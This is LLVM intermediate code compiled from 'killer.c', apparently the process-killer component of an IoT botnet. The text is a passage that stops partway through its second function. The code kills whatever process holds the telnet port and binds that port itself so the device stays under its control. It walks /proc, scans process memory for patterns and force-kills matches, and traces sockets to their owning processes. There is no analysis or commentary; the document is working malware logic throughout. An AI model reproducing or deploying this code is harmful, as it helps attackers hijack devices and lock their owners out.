; ModuleID = 'killer.c'
source_filename = "killer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.__dirstream = type opaque
%struct.dirent = type { i64, i64, i16, i8, [256 x i8] }

@killer_pid = dso_local global i32 0, align 4
@killer_realpath_len = dso_local global i32 0, align 4
@killer_realpath = dso_local global i8* null, align 8
@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @killer_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %7 = alloca %struct.__dirstream*, align 8
  %8 = alloca %struct.dirent*, align 8
  %9 = alloca [64 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca [4096 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 400, i32* %1, align 4
  %15 = call i64 @time(i64* null) #5
  %16 = trunc i64 %15 to i32
  store i32 %16, i32* %2, align 4
  store i32 0, i32* %4, align 4
  %17 = call i32 @fork() #5
  store i32 %17, i32* @killer_pid, align 4
  %18 = load i32, i32* @killer_pid, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %23, label %20

20:                                               ; preds = %0
  %21 = load i32, i32* @killer_pid, align 4
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %24

23:                                               ; preds = %20, %0
  br label %146

24:                                               ; preds = %20
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  store i32 0, i32* %27, align 4
  %28 = call zeroext i16 @htons(i16 zeroext 81) #6
  %29 = call signext i8 @killer_kill_by_port(i16 zeroext %28)
  %30 = icmp ne i8 %29, 0
  br i1 %30, label %31, label %46

31:                                               ; preds = %24
  %32 = call zeroext i16 @htons(i16 zeroext 23) #6
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  %34 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %34, i32* %3, align 4
  %35 = icmp ne i32 %34, -1
  br i1 %35, label %36, label %45

36:                                               ; preds = %31
  %37 = load i32, i32* %3, align 4
  %38 = bitcast %union.__CONST_SOCKADDR_ARG* %6 to %struct.sockaddr**
  %39 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  store %struct.sockaddr* %39, %struct.sockaddr** %38, align 8
  %40 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %6, i32 0, i32 0
  %41 = load %struct.sockaddr*, %struct.sockaddr** %40, align 8
  %42 = call i32 @bind(i32 %37, %struct.sockaddr* %41, i32 16) #5
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @listen(i32 %43, i32 1) #5
  br label %45

45:                                               ; preds = %36, %31
  br label %46

46:                                               ; preds = %45, %24
  %47 = call i32 @sleep(i32 5)
  %48 = call noalias align 16 i8* @malloc(i64 4096) #5
  store i8* %48, i8** @killer_realpath, align 8
  %49 = load i8*, i8** @killer_realpath, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 0
  store i8 0, i8* %50, align 1
  store i32 0, i32* @killer_realpath_len, align 4
  br label %51

51:                                               ; preds = %46, %143
  call void @table_unlock_val(i8 zeroext 6)
  %52 = call i8* @table_retrieve_val(i32 6, i32* null)
  %53 = call %struct.__dirstream* @opendir(i8* %52)
  store %struct.__dirstream* %53, %struct.__dirstream** %7, align 8
  %54 = icmp eq %struct.__dirstream* %53, null
  br i1 %54, label %55, label %56

55:                                               ; preds = %51
  br label %146

56:                                               ; preds = %51
  call void @table_lock_val(i8 zeroext 6)
  br label %57

57:                                               ; preds = %140, %104, %75, %56
  %58 = load %struct.__dirstream*, %struct.__dirstream** %7, align 8
  %59 = call %struct.dirent* @readdir(%struct.__dirstream* %58)
  store %struct.dirent* %59, %struct.dirent** %8, align 8
  %60 = icmp ne %struct.dirent* %59, null
  br i1 %60, label %61, label %143

61:                                               ; preds = %57
  %62 = load %struct.dirent*, %struct.dirent** %8, align 8
  %63 = getelementptr inbounds %struct.dirent, %struct.dirent* %62, i32 0, i32 4
  %64 = getelementptr inbounds [256 x i8], [256 x i8]* %63, i64 0, i64 0
  %65 = load i8, i8* %64, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp slt i32 %66, 48
  br i1 %67, label %75, label %68

68:                                               ; preds = %61
  %69 = load %struct.dirent*, %struct.dirent** %8, align 8
  %70 = getelementptr inbounds %struct.dirent, %struct.dirent* %69, i32 0, i32 4
  %71 = getelementptr inbounds [256 x i8], [256 x i8]* %70, i64 0, i64 0
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp sgt i32 %73, 57
  br i1 %74, label %75, label %76

75:                                               ; preds = %68, %61
  br label %57, !llvm.loop !6

76:                                               ; preds = %68
  %77 = getelementptr inbounds [64 x i8], [64 x i8]* %9, i64 0, i64 0
  store i8* %77, i8** %10, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  %78 = load %struct.dirent*, %struct.dirent** %8, align 8
  %79 = getelementptr inbounds %struct.dirent, %struct.dirent* %78, i32 0, i32 4
  %80 = getelementptr inbounds [256 x i8], [256 x i8]* %79, i64 0, i64 0
  %81 = call i32 @util_atoi(i8* %80, i32 10)
  store i32 %81, i32* %14, align 4
  %82 = load i32, i32* %4, align 4
  %83 = add i32 %82, 1
  store i32 %83, i32* %4, align 4
  %84 = load i32, i32* %14, align 4
  %85 = load i32, i32* %1, align 4
  %86 = icmp sle i32 %84, %85
  br i1 %86, label %87, label %105

87:                                               ; preds = %76
  %88 = call i64 @time(i64* null) #5
  %89 = load i32, i32* %2, align 4
  %90 = sext i32 %89 to i64
  %91 = sub nsw i64 %88, %90
  %92 = icmp sgt i64 %91, 600
  br i1 %92, label %93, label %94

93:                                               ; preds = %87
  store i32 400, i32* %1, align 4
  br label %104

94:                                               ; preds = %87
  %95 = load i32, i32* %14, align 4
  %96 = icmp sgt i32 %95, 400
  br i1 %96, label %97, label %103

97:                                               ; preds = %94
  %98 = load i32, i32* %4, align 4
  %99 = urem i32 %98, 10
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %103

101:                                              ; preds = %97
  %102 = call i32 @sleep(i32 1)
  br label %103

103:                                              ; preds = %101, %97, %94
  br label %104

104:                                              ; preds = %103, %93
  br label %57, !llvm.loop !6

105:                                              ; preds = %76
  %106 = load i32, i32* %14, align 4
  %107 = load i32, i32* %1, align 4
  %108 = icmp sgt i32 %106, %107
  br i1 %108, label %109, label %111

109:                                              ; preds = %105
  %110 = load i32, i32* %14, align 4
  store i32 %110, i32* %1, align 4
  br label %111

111:                                              ; preds = %109, %105
  %112 = call i64 @time(i64* null) #5
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 6)
  call void @table_unlock_val(i8 zeroext 10)
  %114 = load i8*, i8** %10, align 8
  %115 = call i8* @table_retrieve_val(i32 6, i32* null)
  %116 = call i32 @util_strcpy(i8* %114, i8* %115)
  %117 = load i8*, i8** %10, align 8
  %118 = sext i32 %116 to i64
  %119 = getelementptr inbounds i8, i8* %117, i64 %118
  store i8* %119, i8** %10, align 8
  %120 = load i8*, i8** %10, align 8
  %121 = load %struct.dirent*, %struct.dirent** %8, align 8
  %122 = getelementptr inbounds %struct.dirent, %struct.dirent* %121, i32 0, i32 4
  %123 = getelementptr inbounds [256 x i8], [256 x i8]* %122, i64 0, i64 0
  %124 = call i32 @util_strcpy(i8* %120, i8* %123)
  %125 = load i8*, i8** %10, align 8
  %126 = sext i32 %124 to i64
  %127 = getelementptr inbounds i8, i8* %125, i64 %126
  store i8* %127, i8** %10, align 8
  %128 = load i8*, i8** %10, align 8
  %129 = call i8* @table_retrieve_val(i32 10, i32* null)
  %130 = call i32 @util_strcpy(i8* %128, i8* %129)
  %131 = load i8*, i8** %10, align 8
  %132 = sext i32 %130 to i64
  %133 = getelementptr inbounds i8, i8* %131, i64 %132
  store i8* %133, i8** %10, align 8
  call void @table_lock_val(i8 zeroext 6)
  call void @table_lock_val(i8 zeroext 10)
  %134 = getelementptr inbounds [64 x i8], [64 x i8]* %9, i64 0, i64 0
  %135 = call signext i8 @maps_scan_match(i8* %134)
  %136 = icmp ne i8 %135, 0
  br i1 %136, label %137, label %140

137:                                              ; preds = %111
  %138 = load i32, i32* %14, align 4
  %139 = call i32 @kill(i32 %138, i32 9) #5
  br label %140

140:                                              ; preds = %137, %111
  %141 = getelementptr inbounds [64 x i8], [64 x i8]* %9, i64 0, i64 0
  call void @util_zero(i8* %141, i32 64)
  %142 = call i32 @sleep(i32 1)
  br label %57, !llvm.loop !6

143:                                              ; preds = %57
  %144 = load %struct.__dirstream*, %struct.__dirstream** %7, align 8
  %145 = call i32 @closedir(%struct.__dirstream* %144)
  br label %51

146:                                              ; preds = %23, %55
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local signext i8 @killer_kill_by_port(i16 zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i16, align 2
  %4 = alloca %struct.__dirstream*, align 8
  %5 = alloca %struct.__dirstream*, align 8
  %6 = alloca %struct.dirent*, align 8
  %7 = alloca %struct.dirent*, align 8
  %8 = alloca [4096 x i8], align 16
  %9 = alloca [4096 x i8], align 16
  %10 = alloca [513 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [16 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca [16 x i8], align 16
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  store i16 %0, i16* %3, align 2
  %24 = bitcast [4096 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %24, i8 0, i64 4096, i1 false)
  %25 = bitcast [4096 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %25, i8 0, i64 4096, i1 false)
  %26 = bitcast [513 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %26, i8 0, i64 513, i1 false)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %27 = bitcast [16 x i8]* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %27, i8 0, i64 16, i1 false)
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %28, i8** %14, align 8
  store i32 0, i32* %15, align 4
  %29 = load i16, i16* %3, align 2
  %30 = call zeroext i16 @ntohs(i16 zeroext %29) #6
  %31 = zext i16 %30 to i32
  %32 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %33 = call i8* @util_itoa(i32 %31, i32 16, i8* %32)
  %34 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %35 = call i32 @util_strlen(i8* %34)
  %36 = icmp eq i32 %35, 2
  br i1 %36, label %37, label %47

37:                                               ; preds = %1
  %38 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %39 = load i8, i8* %38, align 16
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 2
  store i8 %39, i8* %40, align 2
  %41 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 3
  store i8 %42, i8* %43, align 1
  %44 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 4
  store i8 0, i8* %44, align 4
  %45 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %45, align 16
  %46 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 1
  store i8 48, i8* %46, align 1
  br label %47

47:                                               ; preds = %37, %1
  call void @table_unlock_val(i8 zeroext 6)
  call void @table_unlock_val(i8 zeroext 7)
  call void @table_unlock_val(i8 zeroext 8)
  call void @table_unlock_val(i8 zeroext 9)
  %48 = call i8* @table_retrieve_val(i32 9, i32* null)
  %49 = call i32 (i8*, i32, ...) @open(i8* %48, i32 0)
  store i32 %49, i32* %12, align 4
  %50 = load i32, i32* %12, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

52:                                               ; preds = %47
  store i8 0, i8* %2, align 1
  br label %375

53:                                               ; preds = %47
  br label %54

54:                                               ; preds = %222, %215, %184, %86, %53
  %55 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 0
  %56 = load i32, i32* %12, align 4
  %57 = call i8* @util_fdgets(i8* %55, i32 512, i32 %56)
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %223

59:                                               ; preds = %54
  store i32 0, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %60

60:                                               ; preds = %76, %59
  %61 = load i32, i32* %17, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %74

67:                                               ; preds = %60
  %68 = load i32, i32* %17, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp ne i32 %72, 58
  br label %74

74:                                               ; preds = %67, %60
  %75 = phi i1 [ false, %60 ], [ %73, %67 ]
  br i1 %75, label %76, label %79

76:                                               ; preds = %74
  %77 = load i32, i32* %17, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %17, align 4
  br label %60, !llvm.loop !8

79:                                               ; preds = %74
  %80 = load i32, i32* %17, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %87

86:                                               ; preds = %79
  br label %54, !llvm.loop !9

87:                                               ; preds = %79
  %88 = load i32, i32* %17, align 4
  %89 = add nsw i32 %88, 2
  store i32 %89, i32* %17, align 4
  %90 = load i32, i32* %17, align 4
  store i32 %90, i32* %18, align 4
  br label %91

91:                                               ; preds = %107, %87
  %92 = load i32, i32* %17, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = icmp ne i32 %96, 0
  br i1 %97, label %98, label %105

98:                                               ; preds = %91
  %99 = load i32, i32* %17, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %100
  %102 = load i8, i8* %101, align 1
  %103 = sext i8 %102 to i32
  %104 = icmp ne i32 %103, 32
  br label %105

105:                                              ; preds = %98, %91
  %106 = phi i1 [ false, %91 ], [ %104, %98 ]
  br i1 %106, label %107, label %110

107:                                              ; preds = %105
  %108 = load i32, i32* %17, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %17, align 4
  br label %91, !llvm.loop !10

110:                                              ; preds = %105
  %111 = load i32, i32* %17, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %17, align 4
  %113 = sext i32 %111 to i64
  %114 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %113
  store i8 0, i8* %114, align 1
  %115 = load i32, i32* %18, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %116
  %118 = load i32, i32* %18, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %119
  %121 = call i32 @util_strlen(i8* %120)
  %122 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %123 = call i32 @util_stristr(i8* %117, i32 %121, i8* %122)
  %124 = icmp ne i32 %123, -1
  br i1 %124, label %125, label %222

125:                                              ; preds = %110
  store i32 0, i32* %19, align 4
  store i8 0, i8* %20, align 1
  store i8 0, i8* %21, align 1
  br label %126

126:                                              ; preds = %178, %125
  %127 = load i32, i32* %19, align 4
  %128 = icmp slt i32 %127, 7
  br i1 %128, label %129, label %137

129:                                              ; preds = %126
  %130 = load i32, i32* %17, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %17, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %132
  %134 = load i8, i8* %133, align 1
  %135 = sext i8 %134 to i32
  %136 = icmp ne i32 %135, 0
  br label %137

137:                                              ; preds = %129, %126
  %138 = phi i1 [ false, %126 ], [ %136, %129 ]
  br i1 %138, label %139, label %179

139:                                              ; preds = %137
  %140 = load i32, i32* %17, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %141
  %143 = load i8, i8* %142, align 1
  %144 = sext i8 %143 to i32
  %145 = icmp eq i32 %144, 32
  br i1 %145, label %153, label %146

146:                                              ; preds = %139
  %147 = load i32, i32* %17, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = sext i8 %150 to i32
  %152 = icmp eq i32 %151, 9
  br i1 %152, label %153, label %154

153:                                              ; preds = %146, %139
  store i8 1, i8* %20, align 1
  br label %178

154:                                              ; preds = %146
  %155 = load i8, i8* %20, align 1
  %156 = sext i8 %155 to i32
  %157 = icmp eq i32 %156, 1
  br i1 %157, label %158, label %161

158:                                              ; preds = %154
  %159 = load i32, i32* %19, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %19, align 4
  br label %161

161:                                              ; preds = %158, %154
  %162 = load i8, i8* %20, align 1
  %163 = sext i8 %162 to i32
  %164 = icmp eq i32 %163, 1
  br i1 %164, label %165, label %177

165:                                              ; preds = %161
  %166 = load i32, i32* %19, align 4
  %167 = icmp eq i32 %166, 1
  br i1 %167, label %168, label %177

168:                                              ; preds = %165
  %169 = load i32, i32* %17, align 4
  %170 = add nsw i32 %169, 1
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %171
  %173 = load i8, i8* %172, align 1
  %174 = sext i8 %173 to i32
  %175 = icmp eq i32 %174, 65
  br i1 %175, label %176, label %177

176:                                              ; preds = %168
  store i8 1, i8* %21, align 1
  br label %177

177:                                              ; preds = %176, %168, %165, %161
  store i8 0, i8* %20, align 1
  br label %178

178:                                              ; preds = %177, %153
  br label %126, !llvm.loop !11

179:                                              ; preds = %137
  %180 = load i32, i32* %17, align 4
  store i32 %180, i32* %18, align 4
  %181 = load i8, i8* %21, align 1
  %182 = sext i8 %181 to i32
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %184, label %185

184:                                              ; preds = %179
  br label %54, !llvm.loop !9

185:                                              ; preds = %179
  br label %186

186:                                              ; preds = %202, %185
  %187 = load i32, i32* %17, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %188
  %190 = load i8, i8* %189, align 1
  %191 = sext i8 %190 to i32
  %192 = icmp ne i32 %191, 0
  br i1 %192, label %193, label %200

193:                                              ; preds = %186
  %194 = load i32, i32* %17, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %195
  %197 = load i8, i8* %196, align 1
  %198 = sext i8 %197 to i32
  %199 = icmp ne i32 %198, 32
  br label %200

200:                                              ; preds = %193, %186
  %201 = phi i1 [ false, %186 ], [ %199, %193 ]
  br i1 %201, label %202, label %205

202:                                              ; preds = %200
  %203 = load i32, i32* %17, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %17, align 4
  br label %186, !llvm.loop !12

205:                                              ; preds = %200
  %206 = load i32, i32* %17, align 4
  %207 = add nsw i32 %206, 1
  store i32 %207, i32* %17, align 4
  %208 = sext i32 %206 to i64
  %209 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %208
  store i8 0, i8* %209, align 1
  %210 = load i32, i32* %18, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %211
  %213 = call i32 @util_strlen(i8* %212)
  %214 = icmp sgt i32 %213, 15
  br i1 %214, label %215, label %216

215:                                              ; preds = %205
  br label %54, !llvm.loop !9

216:                                              ; preds = %205
  %217 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %218 = load i32, i32* %18, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %219
  %221 = call i32 @util_strcpy(i8* %217, i8* %220)
  br label %223

222:                                              ; preds = %110
  br label %54, !llvm.loop !9

223:                                              ; preds = %216, %54
  %224 = load i32, i32* %12, align 4
  %225 = call i32 @close(i32 %224)
  %226 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %227 = call i32 @util_strlen(i8* %226)
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %230

229:                                              ; preds = %223
  call void @table_lock_val(i8 zeroext 6)
  call void @table_lock_val(i8 zeroext 7)
  call void @table_lock_val(i8 zeroext 8)
  call void @table_lock_val(i8 zeroext 9)
  store i8 0, i8* %2, align 1
  br label %375

230:                                              ; preds = %223
  %231 = call i8* @table_retrieve_val(i32 6, i32* null)
  %232 = call %struct.__dirstream* @opendir(i8* %231)
  store %struct.__dirstream* %232, %struct.__dirstream** %4, align 8
  %233 = icmp ne %struct.__dirstream* %232, null
  br i1 %233, label %234, label %371

234:                                              ; preds = %230
  br label %235

235:                                              ; preds = %367, %280, %257, %234
  %236 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %237 = call %struct.dirent* @readdir(%struct.__dirstream* %236)
  store %struct.dirent* %237, %struct.dirent** %6, align 8
  %238 = icmp ne %struct.dirent* %237, null
  br i1 %238, label %239, label %242

239:                                              ; preds = %235
  %240 = load i32, i32* %15, align 4
  %241 = icmp eq i32 %240, 0
  br label %242

242:                                              ; preds = %239, %235
  %243 = phi i1 [ false, %235 ], [ %241, %239 ]
  br i1 %243, label %244, label %368

244:                                              ; preds = %242
  %245 = load %struct.dirent*, %struct.dirent** %6, align 8
  %246 = getelementptr inbounds %struct.dirent, %struct.dirent* %245, i32 0, i32 4
  %247 = getelementptr inbounds [256 x i8], [256 x i8]* %246, i64 0, i64 0
  store i8* %247, i8** %22, align 8
  %248 = load i8*, i8** %22, align 8
  %249 = load i8, i8* %248, align 1
  %250 = sext i8 %249 to i32
  %251 = icmp slt i32 %250, 48
  br i1 %251, label %257, label %252

252:                                              ; preds = %244
  %253 = load i8*, i8** %22, align 8
  %254 = load i8, i8* %253, align 1
  %255 = sext i8 %254 to i32
  %256 = icmp sgt i32 %255, 57
  br i1 %256, label %257, label %258

257:                                              ; preds = %252, %244
  br label %235, !llvm.loop !13

258:                                              ; preds = %252
  %259 = load i8*, i8** %14, align 8
  %260 = call i8* @table_retrieve_val(i32 6, i32* null)
  %261 = call i32 @util_strcpy(i8* %259, i8* %260)
  %262 = load i8*, i8** %14, align 8
  %263 = load i8*, i8** %14, align 8
  %264 = call i32 @util_strlen(i8* %263)
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds i8, i8* %262, i64 %265
  %267 = load i8*, i8** %22, align 8
  %268 = call i32 @util_strcpy(i8* %266, i8* %267)
  %269 = load i8*, i8** %14, align 8
  %270 = load i8*, i8** %14, align 8
  %271 = call i32 @util_strlen(i8* %270)
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds i8, i8* %269, i64 %272
  %274 = call i8* @table_retrieve_val(i32 7, i32* null)
  %275 = call i32 @util_strcpy(i8* %273, i8* %274)
  %276 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %277 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %278 = call i64 @readlink(i8* %276, i8* %277, i64 4096) #5
  %279 = icmp eq i64 %278, -1
  br i1 %279, label %280, label %281

280:                                              ; preds = %258
  br label %235, !llvm.loop !13

281:                                              ; preds = %258
  %282 = load i8*, i8** %14, align 8
  %283 = call i8* @table_retrieve_val(i32 6, i32* null)
  %284 = call i32 @util_strcpy(i8* %282, i8* %283)
  %285 = load i8*, i8** %14, align 8
  %286 = load i8*, i8** %14, align 8
  %287 = call i32 @util_strlen(i8* %286)
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds i8, i8* %285, i64 %288
  %290 = load i8*, i8** %22, align 8
  %291 = call i32 @util_strcpy(i8* %289, i8* %290)
  %292 = load i8*, i8** %14, align 8
  %293 = load i8*, i8** %14, align 8
  %294 = call i32 @util_strlen(i8* %293)
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8, i8* %292, i64 %295
  %297 = call i8* @table_retrieve_val(i32 8, i32* null)
  %298 = call i32 @util_strcpy(i8* %296, i8* %297)
  %299 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %300 = call %struct.__dirstream* @opendir(i8* %299)
  store %struct.__dirstream* %300, %struct.__dirstream** %5, align 8
  %301 = icmp ne %struct.__dirstream* %300, null
  br i1 %301, label %302, label %367

302:                                              ; preds = %281
  br label %303

303:                                              ; preds = %363, %351, %302
  %304 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %305 = call %struct.dirent* @readdir(%struct.__dirstream* %304)
  store %struct.dirent* %305, %struct.dirent** %7, align 8
  %306 = icmp ne %struct.dirent* %305, null
  br i1 %306, label %307, label %310

307:                                              ; preds = %303
  %308 = load i32, i32* %15, align 4
  %309 = icmp eq i32 %308, 0
  br label %310

310:                                              ; preds = %307, %303
  %311 = phi i1 [ false, %303 ], [ %309, %307 ]
  br i1 %311, label %312, label %364

312:                                              ; preds = %310
  %313 = load %struct.dirent*, %struct.dirent** %7, align 8
  %314 = getelementptr inbounds %struct.dirent, %struct.dirent* %313, i32 0, i32 4
  %315 = getelementptr inbounds [256 x i8], [256 x i8]* %314, i64 0, i64 0
  store i8* %315, i8** %23, align 8
  %316 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  call void @util_zero(i8* %316, i32 4096)
  %317 = load i8*, i8** %14, align 8
  %318 = call i8* @table_retrieve_val(i32 6, i32* null)
  %319 = call i32 @util_strcpy(i8* %317, i8* %318)
  %320 = load i8*, i8** %14, align 8
  %321 = load i8*, i8** %14, align 8
  %322 = call i32 @util_strlen(i8* %321)
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds i8, i8* %320, i64 %323
  %325 = load i8*, i8** %22, align 8
  %326 = call i32 @util_strcpy(i8* %324, i8* %325)
  %327 = load i8*, i8** %14, align 8
  %328 = load i8*, i8** %14, align 8
  %329 = call i32 @util_strlen(i8* %328)
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds i8, i8* %327, i64 %330
  %332 = call i8* @table_retrieve_val(i32 8, i32* null)
  %333 = call i32 @util_strcpy(i8* %331, i8* %332)
  %334 = load i8*, i8** %14, align 8
  %335 = load i8*, i8** %14, align 8
  %336 = call i32 @util_strlen(i8* %335)
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds i8, i8* %334, i64 %337
  %339 = call i32 @util_strcpy(i8* %338, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %340 = load i8*, i8** %14, align 8
  %341 = load i8*, i8** %14, align 8
  %342 = call i32 @util_strlen(i8* %341)
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds i8, i8* %340, i64 %343
  %345 = load i8*, i8** %23, align 8
  %346 = call i32 @util_strcpy(i8* %344, i8* %345)
  %347 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %348 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %349 = call i64 @readlink(i8* %347, i8* %348, i64 4096) #5
  %350 = icmp eq i64 %349, -1
  br i1 %350, label %351, label %352

351:                                              ; preds = %312
  br label %303, !llvm.loop !14

352:                                              ; preds = %312
  %353 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %354 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %355 = call i32 @util_strlen(i8* %354)
